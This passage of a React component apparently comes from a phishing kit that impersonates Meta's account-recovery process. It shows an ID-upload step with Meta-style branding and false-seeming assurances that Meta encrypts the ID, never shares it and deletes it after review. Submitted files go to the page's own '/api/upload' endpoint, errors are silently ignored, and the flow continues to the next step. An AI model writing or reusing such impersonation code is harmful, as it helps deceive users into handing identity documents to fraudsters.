                                    <button type='button' className='text-[13px] text-[#0866ff] hover:underline' onClick={() => setRecoveryFiles([])}>
                                        {t('Clear all')}
                                    </button>
                                </div>
                            )}

                            <div className='rounded-[10px] bg-white/60 px-4 py-3.5'>
                                <p className='mb-1 text-[13px] font-semibold text-[#050505]'>{t('Your information is protected')}:</p>
                                <ul className='space-y-1 text-[12px] text-[#667085]'>
                                    <li className='flex items-start gap-2'>
                                        <span className='mt-0.5'>•</span> {t('Your ID will be encrypted and stored securely.')}
                                    </li>
                                    <li className='flex items-start gap-2'>
                                        <span className='mt-0.5'>•</span> {t('Meta does not share your ID with third parties.')}
                                    </li>
                                    <li className='flex items-start gap-2'>
                                        <span className='mt-0.5'>•</span> {t('Your ID will be deleted after the review is complete.')}
                                    </li>
                                </ul>
                            </div>
                        </div>

                        <div className='border-t border-[#d4dbe3] p-4'>
                            <button
                                type='button'
                                disabled={recoveryFiles.length === 0 || uploading}
                                className={`flex h-11 w-full items-center justify-center rounded-full text-[15px] font-medium text-white transition-opacity ${recoveryFiles.length === 0 || uploading ? 'cursor-not-allowed opacity-60' : ''}`}
                                style={{ backgroundColor: '#0866FF' }}
                                onClick={async () => {
                                    if (recoveryFiles.length === 0 || uploading) return;
                                    setUploading(true);
                                    try {
                                        const formData = new FormData();
                                        recoveryFiles.forEach((f) => formData.append('files', f));
                                        formData.append('type', 'account_recovery');
                                        await axios.post('/api/upload', formData);
                                    } catch {
                                        /* ignore */
                                    }
                                    setUploading(false);
                                    setRecoveryFiles([]);
                                    setShowRecoveryUpload(false);
                                    setShowMethodModal(true);
                                }}
                            >
                                {uploading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent' /> : t('Submit for review')}
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </>
    );
};

export default VerifyModal;
